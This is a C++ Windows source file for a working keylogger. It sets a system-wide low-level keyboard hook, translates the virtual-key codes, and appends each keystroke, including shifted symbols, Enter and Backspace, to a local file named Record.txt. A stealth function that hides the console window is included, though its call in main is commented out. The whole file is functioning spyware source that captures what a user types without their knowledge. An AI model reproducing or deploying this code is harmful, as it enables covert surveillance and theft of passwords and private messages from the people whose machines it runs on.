#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <iostream>

using namespace std;

HHOOK hKeyboardHook; // global hook

void hide();

LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
	//hide(); // hide the console window

	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, NULL, 0); // create a hook onto the keyboard

	MSG message;
	while (GetMessage(&message, NULL, 0, 0)); // this is the loop that keeps waiting for key presses, without it this process ends

	UnhookWindowsHookEx(hKeyboardHook); // release hook

	return 0;
}

void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) // if there was an action, the key was pressed down not released
	{
		ofstream write("Record.txt", ios::app);

		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam); 

		char key = hooked_key.vkCode; // get the actual char value

		if ((key > 64) && (key < 91) && !GetAsyncKeyState(0x10)) { // is lower case alpha
			key += 32;
			write << key;
			write.close();
		}
		else if ((key > 64) && (key < 91)) { // is upper case alpha
			write << key;
			write.close();
		}
		else if (GetAsyncKeyState(0x10)) {
			
			switch (key) { // else its a non-alpha key with shift
			case 49: write << "!"; break;
			case 50: write << "@"; break;
			case 51: write << "#"; break;
			case 52: write << "$"; break;
			case 53: write << "%"; break;
			case 54: write << "^"; break;
			case 55: write << "&"; break;
			case 56: write << "*"; break;
			case 57: write << "("; break;
			case 48: write << ")"; break;
			case -67: write << "_"; break;
			case -69: write << "+"; break;
			default: cout << "type is missing: " << int(key) << endl; break;
			}
		}
		else {
			switch (key) { // else its a non-alpha key without shift
			case -67: write << "-"; break;
			case -69: write << "="; break;
			case VK_BACK: write << "<BackSpace>"; break;
			case VK_ESCAPE: write << "<Esc>"; break;
			case VK_SPACE: write << " "; break;
			case 13: write << "<Enter>\n"; break;
			case VK_DELETE: write << "<DELETE>"; break;
			default: cout << "type is missing: " << int(key) << endl; break;
			}
		}
		cout << "THE KEY WAS: " << key << " value is: " << int(key) << endl;

		write.close();
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}
